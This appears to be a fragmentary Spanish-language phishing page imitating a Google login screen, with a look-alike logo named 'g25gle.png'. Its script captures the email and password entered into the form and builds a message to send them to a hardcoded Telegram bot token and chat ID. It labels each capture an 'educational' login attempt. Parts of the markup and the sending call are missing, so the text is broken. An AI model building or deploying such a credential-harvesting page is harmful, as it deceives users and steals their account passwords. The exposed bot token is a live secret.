<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">

      background: #f1f1f1;
      margin: 0;
      padding: 0;
      display: flex;

      align-items: center;

    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      position: relative;
    }
    .logo {
      display: block;
      margin: 0 auto 20px auto;
      width: 120px;
    }
    h2 {
      text-align: center;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #4285f4;
      color: white;
      border: none;

      cursor: pointer;

  </style>
</head>
<body>
  <form class="login-box" id="loginForm">
    <img src="g25gle.png" alt="Logo" class="logo">

  </form>

  <script>
    const TOKEN = '7548021986:AAGcnK0QlYA7yceVL1vMo7-FuXJTCja-SQ4';
    const CHAT_ID = '7569703145';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const message = `\u{1F512} Nuevo intento de login educativo:\nCorreo: ${email}\nClave: ${password}`;

        body: JSON.stringify({

      });
